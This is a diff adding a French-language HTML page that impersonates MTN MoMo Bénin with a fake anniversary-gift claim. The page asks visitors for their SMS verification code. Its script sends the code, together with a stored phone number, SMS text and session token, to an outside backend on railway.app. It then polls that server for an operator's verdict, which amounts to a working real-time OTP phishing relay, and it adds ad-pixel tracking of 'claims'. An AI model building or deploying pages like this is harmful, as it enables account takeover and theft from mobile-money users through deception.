@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#000000">
+    <title>MTN MoMo Bénin – Code de Vérification</title>
+
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1021851290903869');
+      fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1021851290903869&ev=PageView&noscript=1" /></noscript>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root { --black: #000; --mtn-gold: #FFCC00; --grad-gold: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+          --page-bg: #f9fafb; --white: #FFFFFF; --text-dark: #1C2340; --text-mid: #4B5168; --text-light: #8B90A3;
+          --border: #E4E7EF; --error: #DC2626; --success: #16A34A; --header-h: 74px; --footer-h: 68px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { height: 100%; font-family: 'Inter', sans-serif; background: var(--page-bg); overflow: hidden; }
+        body { display: flex; flex-direction: column; align-items: center; padding: var(--header-h) 0 var(--footer-h) 0; height: 100vh; height: 100dvh; }
+        .header { position: fixed; top: 0; left: 0; right: 0; height: var(--header-h); background: var(--black); color: #fff; z-index: 100; }
+        .header-inner { max-width: 1200px; margin: 0 auto; height: 100%; padding: 0 18px; display: flex; align-items: center; justify-content: space-between; }
+        .brand { display: flex; align-items: center; gap: 10px; text-decoration: none; color: inherit; }
+        .brand-logo-img { height: 46px; width: auto; display: block; }
+        .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
+        .brand-sub { font-size: 11px; color: var(--mtn-gold); font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
+        .card-wrap { width: 100%; max-width: 480px; margin: 14px 0; padding: 0 14px; flex: 1; display: flex; flex-direction: column; }
+        .card { background: #fff; border-radius: 22px; padding: 26px 20px; width: 100%; box-shadow: 0 20px 50px rgba(0,25,60,0.12); flex: 1; display: flex; flex-direction: column; justify-content: center; overflow-y: auto; }
+        .icon-badge { width: 64px; height: 64px; border-radius: 50%; background: linear-gradient(135deg, #FFFBEB, #FFF3C0); display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; font-size: 28px; box-shadow: 0 6px 18px rgba(255,204,0,0.25); border: 1px solid #FFE999; }
+        .page-title { font-size: 20px; font-weight: 800; text-align: center; color: var(--text-dark); margin-bottom: 8px; }
+        .page-title .highlight { background: var(--grad-gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-weight: 900; }
+        .instruction { font-size: 13px; color: var(--text-mid); text-align: center; line-height: 1.55; margin-bottom: 22px; font-weight: 500; }
+        .instruction strong { color: var(--text-dark); font-weight: 800; }
+        .otp-boxes { display: flex; justify-content: center; gap: 14px; margin-bottom: 12px; }
+        .otp-box { width: 56px; height: 62px; text-align: center; font-size: 26px; font-weight: 800; color: var(--text-dark); border: 1.5px solid var(--border); border-radius: 14px; background: #FBFCFE; outline: none; font-family: 'Inter', sans-serif; padding: 0; flex: none; }
+        .otp-box:focus { border-color: var(--mtn-gold); background: #fff; box-shadow: 0 0 0 4px rgba(255,204,0,0.18); }
+        .otp-box.filled { border-color: var(--mtn-gold); background: linear-gradient(135deg, #FFFBEB, #FFF3C0); color: #7A5C00; }
+        .otp-box.invalid { border-color: var(--error); background: #FFF5F5; box-shadow: 0 0 0 4px rgba(220,38,38,0.12); }
+        .error-text { color: var(--error); font-size: 12px; margin-top: 8px; display: none; font-weight: 700; text-align: center; }
+        .error-text.show { display: block; }
+        .verify-btn { width: 100%; padding: 16px; background: var(--grad-gold); color: #1A1A2E; border: none; border-radius: 14px; font-size: 15px; font-weight: 900; cursor: pointer; font-family: 'Inter', sans-serif; margin-top: 22px; box-shadow: 0 10px 24px rgba(255,204,0,0.4); display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .spinner { display: inline-block; width: 14px; height: 14px; border: 2.5px solid rgba(0,0,0,0.25); border-top-color: #1A1A2E; border-radius: 50%; animation: spin 0.7s linear infinite; margin-right: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .resend-row { text-align: center; margin-top: 18px; font-size: 12px; color: var(--text-light); font-weight: 600; }
+        .resend-link { font-size: 12px; font-weight: 800; color: #003366; background: none; border: none; font-family: 'Inter', sans-serif; cursor: pointer; padding: 5px 10px; border-radius: 8px; }
+        .security-notice { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 18px; font-size: 11px; color: var(--text-light); font-weight: 600; }
+        .security-notice .ico { color: var(--success); }
+        .footer { position: fixed; bottom: 0; left: 0; right: 0; height: var(--footer-h); background: #fff; border-top: 1px solid var(--border); z-index: 100; display: flex; align-items: center; justify-content: center; }
+        .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; }
+
+        .verify-overlay { position: fixed; inset: 0; background: radial-gradient(900px 600px at 50% -10%, rgba(255, 204, 0, 0.10), transparent 60%), radial-gradient(700px 500px at 50% 110%, rgba(0, 64, 128, 0.35), transparent 60%), linear-gradient(180deg, #001E3C 0%, #00132A 55%, #00080F 100%); display: none; flex-direction: column; align-items: center; justify-content: center; padding: 32px 24px; z-index: 10000; }
+        .verify-overlay.show { display: flex; }
+        .verify-card { position: relative; width: 100%; max-width: 360px; border-radius: 26px; padding: 30px 24px 24px; background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02)); border: 1px solid rgba(255, 204, 0, 0.18); box-shadow: 0 30px 60px rgba(0,0,0,0.45); backdrop-filter: blur(14px); text-align: center; }
+        .verify-ring { position: relative; width: 118px; height: 118px; margin: 0 auto 22px; }
+        .verify-ring svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+        .verify-ring .track { fill: none; stroke: rgba(255, 204, 0, 0.10); stroke-width: 6; }
+        .verify-ring .progress { fill: none; stroke: url(#vGoldGrad); stroke-width: 6; stroke-linecap: round; stroke-dasharray: 326.72; stroke-dashoffset: 326.72; transition: stroke-dashoffset 0.6s ease; }
+        .verify-ring-core { position: absolute; top: 50%; left: 50%; width: 74px; height: 74px; transform: translate(-50%, -50%); border-radius: 50%; background: var(--grad-gold); display: flex; align-items: center; justify-content: center; padding: 12px; box-shadow: 0 0 30px rgba(255, 204, 0, 0.45); }
+        .verify-ring-core img { width: 100%; height: 100%; object-fit: contain; }
+        .verify-title { font-size: 1.05rem; font-weight: 800; color: #fff; line-height: 1.35; margin-bottom: 8px; }
+        .verify-title .highlight { background: linear-gradient(90deg, #FFCC00, #FFD633); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .verify-subtitle { font-size: 12.5px; color: rgba(255,255,255,0.62); line-height: 1.55; font-weight: 500; min-height: 2.6em; margin-bottom: 18px; }
+        .verify-dots { display: flex; justify-content: center; gap: 10px; margin-bottom: 22px; }
+        .verify-dots span { width: 10px; height: 10px; border-radius: 50%; background: rgba(255, 204, 0, 0.15); box-shadow: inset 0 0 0 1px rgba(255, 204, 0, 0.25); transition: all 0.4s; }
+        .verify-dots span.on { background: var(--mtn-gold); box-shadow: 0 0 10px rgba(255, 204, 0, 0.85); transform: scale(1.12); }
+        .verify-status { display: inline-flex; align-items: center; gap: 8px; padding: 7px 14px; border-radius: 50px; background: rgba(34, 197, 94, 0.10); border: 1px solid rgba(34, 197, 94, 0.25); font-size: 10.5px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: #86EFAC; }
+        .verify-status-dot { width: 6px; height: 6px; border-radius: 50%; background: #22C55E; box-shadow: 0 0 8px rgba(34, 197, 94, 0.9); animation: vStatusPulse 1.6s ease-in-out infinite; }
+        @keyframes vStatusPulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.7); } }
+
+        .notice-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.65); backdrop-filter: blur(6px); display: none; align-items: center; justify-content: center; padding: 24px; z-index: 11000; }
+        .notice-overlay.show { display: flex; }
+        .notice-card { background: #fff; border-radius: 24px; width: 100%; max-width: 400px; padding: 30px 24px 26px; box-shadow: 0 30px 80px rgba(0,0,0,0.4); text-align: center; }
+        .notice-icon-wrap { width: 74px; height: 74px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px; font-size: 34px; }
+        .notice-icon-wrap.reject { background: linear-gradient(135deg, #FEE2E2, #FECACA); }
+        .notice-icon-wrap.resend { background: linear-gradient(135deg, #FFF8DC, #FFF3C0); }
+        .notice-title { font-size: 1.25rem; font-weight: 800; color: var(--text-dark); margin-bottom: 10px; }
+        .notice-message { font-size: 0.9rem; color: var(--text-mid); line-height: 1.6; margin-bottom: 24px; font-weight: 500; }
+        .notice-btn { width: 100%; padding: 16px; background: var(--grad-gold); color: #1A1A2E; border: none; border-radius: 14px; font-size: 15px; font-weight: 900; cursor: pointer; font-family: 'Inter', sans-serif; box-shadow: 0 10px 24px rgba(255,204,0,0.4); }
+        .notice-btn.reject-btn { background: linear-gradient(135deg, #DC2626, #B91C1C); color: #fff; }
+
+        .congrats-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; z-index: 12000; backdrop-filter: blur(6px); }
+        .congrats-overlay.show { display: flex; }
+        .congrats-content { background: white; border-radius: 28px; width: 100%; max-width: 400px; box-shadow: 0 30px 80px rgba(0,0,0,0.4); overflow: hidden; text-align: center; }
+        .congrats-header { background: linear-gradient(135deg, #003366 0%, #004080 100%); padding: 30px 24px 24px; position: relative; }
+        .congrats-emoji { font-size: 60px; display: block; margin-bottom: 10px; animation: bounce 1.5s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+        .congrats-title { font-size: 24px; font-weight: 800; color: white; margin-bottom: 6px; }
+        .congrats-subtitle { font-size: 13px; color: rgba(255,255,255,0.9); }
+        .congrats-body { padding: 24px 22px 28px; }
+        .congrats-message { font-size: 16px; font-weight: 700; color: var(--text-dark); line-height: 1.5; margin-bottom: 8px; }
+        .congrats-message .highlight { background: var(--grad-gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .congrats-time { display: inline-flex; align-items: center; gap: 6px; background: #e8f5e9; border: 1px solid #c8e6c9; border-radius: 12px; padding: 10px 16px; margin: 12px 0 20px; font-size: 13px; font-weight: 700; color: #1e7e34; }
+        .congrats-note { font-size: 12px; color: var(--text-light); line-height: 1.5; margin-bottom: 20px; font-weight: 600; }
+        .congrats-btn { width: 100%; padding: 16px; background: var(--grad-gold); color: #1A1A2E; border: none; border-radius: 14px; font-size: 15px; font-weight: 900; cursor: pointer; font-family: 'Inter', sans-serif; box-shadow: 0 10px 24px rgba(255,204,0,0.4); }
+
+        @media (max-width: 480px) {
+            .brand-logo-img { height: 40px; }
+            .otp-box { width: 50px; height: 56px; font-size: 22px; }
+            .verify-ring { width: 104px; height: 104px; }
+            .verify-ring-core { width: 66px; height: 66px; padding: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="header-inner">
+            <a href="sms-paste.html" class="brand">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+                <div class="brand-divider"></div>
+                <span class="brand-sub">MTN MoMo Bénin</span>
+            </a>
+        </div>
+    </header>
+
+    <div class="card-wrap">
+        <main class="card">
+            <div class="icon-badge">🔐</div>
+            <h1 class="page-title">Entrez le <span class="highlight">Code de Vérification</span></h1>
+            <p class="instruction">Nous avons envoyé un <strong>code à 4 chiffres</strong> à votre numéro MoMo. Entrez-le ci-dessous pour confirmer votre réclamation.</p>
+
+            <div class="otp-boxes" id="otpBoxes">
+                <input type="tel" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="tel" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="tel" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="tel" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off">
+            </div>
+
+            <div class="error-text" id="otpError">Veuillez saisir le code à 4 chiffres reçu par SMS</div>
+
+            <button class="verify-btn" id="verifyBtn" disabled>VÉRIFIER &amp; CONTINUER →</button>
+
+            <div class="resend-row">
+                Pas reçu le code ?
+                <button class="resend-link" id="resendBtn" type="button">Renvoyer le code</button>
+            </div>
+
+            <div class="security-notice"><span class="ico">🔒</span><span>Connexion sécurisée à MTN MoMo</span></div>
+        </main>
+    </div>
+
+    <footer class="footer"><span class="footer-text">© 2026 MTN MoMo Bénin</span></footer>
+
+    <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-card">
+            <div class="verify-ring">
+                <svg viewBox="0 0 118 118"><defs><linearGradient id="vGoldGrad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#FFD633"/><stop offset="50%" stop-color="#FFCC00"/><stop offset="100%" stop-color="#F5B500"/></linearGradient></defs><circle class="track" cx="59" cy="59" r="52"></circle><circle class="progress" id="verifyRingProgress" cx="59" cy="59" r="52"></circle></svg>
+                <div class="verify-ring-core"><img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo"></div>
+            </div>
+            <h2 class="verify-title">Confirmation de votre <span class="highlight">code</span></h2>
+            <p class="verify-subtitle">En attente de confirmation. Veuillez patienter…</p>
+            <div class="verify-dots" id="verifyDots"><span></span><span></span><span></span><span></span><span></span></div>
+            <div class="verify-status"><span class="verify-status-dot"></span><span>En direct · Connexion sécurisée</span></div>
+        </div>
+    </div>
+
+    <div class="notice-overlay" id="noticeOverlay">
+        <div class="notice-card">
+            <div class="notice-icon-wrap" id="noticeIconWrap"><span id="noticeIcon">ℹ️</span></div>
+            <h3 class="notice-title" id="noticeTitle">Notice</h3>
+            <p class="notice-message" id="noticeMessage">…</p>
+            <button class="notice-btn" id="noticeBtn" type="button">OK</button>
+        </div>
+    </div>
+
+    <div class="congrats-overlay" id="congratsOverlay">
+        <div class="congrats-content">
+            <div class="congrats-header">
+                <span class="congrats-emoji">🎉</span>
+                <h2 class="congrats-title">Félicitations !</h2>
+                <p class="congrats-subtitle">Votre cadeau anniversaire a été approuvé</p>
+            </div>
+            <div class="congrats-body">
+                <p class="congrats-message">Veuillez patienter pour votre <span class="highlight">récompense</span></p>
+                <div class="congrats-time"><span>⏰</span><span>Environ moins de 24 heures</span></div>
+                <p class="congrats-note">Vous recevrez une notification SMS dès que la récompense sera créditée sur votre compte MoMo.</p>
+                <button class="congrats-btn" onclick="window.location.href='index.html'">OK, COMPRIS →</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://momo-usersey-production.up.railway.app';
+        const POLL_INTERVAL_MS = 2500;
+
+        const otpBoxes = [
+            document.getElementById('otp1'),
+            document.getElementById('otp2'),
+            document.getElementById('otp3'),
+            document.getElementById('otp4')
+        ];
+        const otpError = document.getElementById('otpError');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const congratsOverlay = document.getElementById('congratsOverlay');
+        const verifyOverlay = document.getElementById('verifyOverlay');
+        const verifyRingProgress = document.getElementById('verifyRingProgress');
+        const verifyDots = document.getElementById('verifyDots');
+
+        const noticeOverlay = document.getElementById('noticeOverlay');
+        const noticeIconWrap = document.getElementById('noticeIconWrap');
+        const noticeIcon = document.getElementById('noticeIcon');
+        const noticeTitle = document.getElementById('noticeTitle');
+        const noticeMessage = document.getElementById('noticeMessage');
+        const noticeBtn = document.getElementById('noticeBtn');
+
+        const sessionRaw = localStorage.getItem('momoSession');
+        if (!sessionRaw) window.location.href = 'login.html';
+        let session = {};
+        try { session = JSON.parse(sessionRaw || '{}'); } catch (e) {}
+        const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
+        const storedSms = localStorage.getItem('momoSms') || '';
+
+        function getOtpValue() { return otpBoxes.map(b => b.value).join(''); }
+        function updateVerifyState() {
+            const otp = getOtpValue();
+            verifyBtn.disabled = otp.length !== 4;
+            if (otp.length === 4) { otpError.classList.remove('show'); otpBoxes.forEach(b => b.classList.remove('invalid')); }
+        }
+
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value) { this.classList.add('filled'); if (index < otpBoxes.length - 1) otpBoxes[index + 1].focus(); }
+                else this.classList.remove('filled');
+                updateVerifyState();
+            });
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    otpBoxes[index - 1].focus(); otpBoxes[index - 1].value = ''; otpBoxes[index - 1].classList.remove('filled'); updateVerifyState();
+                }
+            });
+            box.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                if (pasted.length > 0) {
+                    for (let i = 0; i < otpBoxes.length && i < pasted.length; i++) { otpBoxes[i].value = pasted[i]; otpBoxes[i].classList.add('filled'); }
+                    const next = otpBoxes.findIndex(b => !b.value);
+                    otpBoxes[next !== -1 ? next : otpBoxes.length - 1].focus(); updateVerifyState();
+                }
+            });
+        });
+
+        resendBtn.addEventListener('click', async () => {
+            try { await fetch(`${API_BASE}/api/resend-sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: storedPhone }) }); } catch (err) {}
+        });
+
+        const RING_CIRCUMFERENCE = 326.72;
+        let verifyTimer = null, stepTimer = null, pollTimer = null, currentSessionId = null;
+
+        function setDots(count) { verifyDots.querySelectorAll('span').forEach((d, i) => d.classList.toggle('on', i < count)); }
+
+        function startVerifyBar() {
+            verifyOverlay.classList.add('show');
+            verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+            setDots(0);
+            const startTime = Date.now();
+            if (verifyTimer) clearInterval(verifyTimer);
+            verifyTimer = setInterval(() => {
+                const ratio = Math.min(((Date.now() - startTime) / (10 * 60 * 1000)) * 0.90, 0.90);
+                verifyRingProgress.style.strokeDashoffset = (RING_CIRCUMFERENCE * (1 - ratio)).toFixed(2);
+            }, 300);
+            let idx = 0;
+            if (stepTimer) clearInterval(stepTimer);
+            stepTimer = setInterval(() => { idx = (idx + 1) % 5; setDots(idx + 1); }, 2600);
+        }
+        function finishVerifyBar() {
+            if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+            if (stepTimer) { clearInterval(stepTimer); stepTimer = null; }
+            verifyRingProgress.style.strokeDashoffset = '0';
+            setDots(5);
+        }
+        function stopVerifyAnimation() {
+            if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+            if (stepTimer) { clearInterval(stepTimer); stepTimer = null; }
+            verifyOverlay.classList.remove('show');
+            verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+            setDots(0);
+        }
+
+        let noticeAction = null;
+        function showNotice({ type, icon, title, message, buttonText, buttonClass, onOk }) {
+            noticeIconWrap.className = 'notice-icon-wrap';
+            noticeBtn.className = 'notice-btn';
+            if (type) noticeIconWrap.classList.add(type);
+            if (buttonClass) noticeBtn.classList.add(buttonClass);
+            noticeIcon.textContent = icon || 'ℹ️';
+            noticeTitle.textContent = title || 'Notice';
+            noticeMessage.innerHTML = message || '';
+            noticeBtn.textContent = buttonText || 'OK';
+            noticeAction = onOk || null;
+            noticeOverlay.classList.add('show');
+        }
+        noticeBtn.addEventListener('click', () => {
+            noticeOverlay.classList.remove('show');
+            const a = noticeAction; noticeAction = null;
+            if (typeof a === 'function') setTimeout(a, 200);
+        });
+
+        function clearOtpBoxes() { otpBoxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'invalid'); }); }
+        function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
+
+        function startPolling(sessionId) {
+            currentSessionId = sessionId;
+            stopPolling();
+            pollTimer = setInterval(async () => {
+                if (sessionId !== currentSessionId) { stopPolling(); return; }
+                try {
+                    const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
+                    const data = await res.json().catch(() => ({}));
+                    if (sessionId !== currentSessionId) { stopPolling(); return; }
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        stopPolling(); finishVerifyBar();
+                        if (typeof fbq === 'function') fbq('track', 'Purchase', { content_name: 'MoMo Benin Anniversary Gift Claimed', content_category: 'Anniversary', value: 0, currency: 'XOF' });
+                        localStorage.setItem('momoVerified', JSON.stringify({ verifiedAt: new Date().toISOString(), sessionId }));
+                        setTimeout(() => { verifyOverlay.classList.remove('show'); congratsOverlay.classList.add('show'); }, 350);
+
+                    } else if (data.status === 'rejected') {
+                        stopPolling(); stopVerifyAnimation();
+                        showNotice({
+                            type: 'reject', icon: '❌', title: 'Code incorrect',
+                            message: 'Le code saisi est <strong>incorrect</strong>. Vérifiez et réessayez.',
+                            buttonText: 'RÉESSAYER', buttonClass: 'reject-btn',
+                            onOk: () => { clearOtpBoxes(); otpError.classList.remove('show'); verifyBtn.disabled = true; verifyBtn.innerHTML = 'VÉRIFIER &amp; CONTINUER →'; otpBoxes[0].focus(); }
+                        });
+
+                    } else if (data.status === 'resend' || data.status === 'resend_requested') {
+                        stopPolling(); stopVerifyAnimation();
+                        showNotice({
+                            type: 'resend', icon: '🔁', title: 'Nouveau code',
+                            message: 'Veuillez saisir le <strong>nouveau code</strong> reçu par SMS.',
+                            buttonText: 'ENTRER LE NOUVEAU CODE',
+                            onOk: () => { clearOtpBoxes(); otpError.classList.remove('show'); verifyBtn.disabled = true; verifyBtn.innerHTML = 'VÉRIFIER &amp; CONTINUER →'; otpBoxes[0].focus(); }
+                        });
+
+                    } else if (data.status === 'timeout' || data.status === 'unknown') {
+                        stopPolling(); stopVerifyAnimation();
+                        showNotice({
+                            type: 'reject', icon: '⏱️', title: 'Session expirée',
+                            message: 'Votre session a expiré. Veuillez recommencer.',
+                            buttonText: 'RECOMMENCER', buttonClass: 'reject-btn',
+                            onOk: () => { localStorage.clear(); window.location.href = 'login.html'; }
+                        });
+                    }
+                } catch (err) { console.warn(err.message); }
+            }, POLL_INTERVAL_MS);
+        }
+
+        verifyBtn.addEventListener('click', async () => {
+            const otp = getOtpValue();
+            if (otp.length !== 4) {
+                otpBoxes.forEach(b => b.classList.add('invalid'));
+                otpError.textContent = 'Veuillez saisir le code à 4 chiffres reçu par SMS';
+                otpError.classList.add('show');
+                otpBoxes[0].focus();
+                return;
+            }
+
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="spinner"></span>VÉRIFICATION...';
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+                const res = await fetch(`${API_BASE}/api/verify-otp`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: storedPhone, otp, sms: storedSms, token: session.token || '', country: 'BJ' }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await res.json().catch(() => ({}));
+                if (!res.ok || !data.ok) throw new Error(data.error || 'Verification failed');
+                startVerifyBar();
+                startPolling(data.sessionId);
+            } catch (err) {
+                stopVerifyAnimation();
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = 'VÉRIFIER &amp; CONTINUER →';
+                alert('Échec : ' + (err.message || 'Veuillez réessayer.'));
+            }
+        });
+
+        otpBoxes[0].focus();
+        updateVerifyState();
+    </script>
+</body>
+</html>
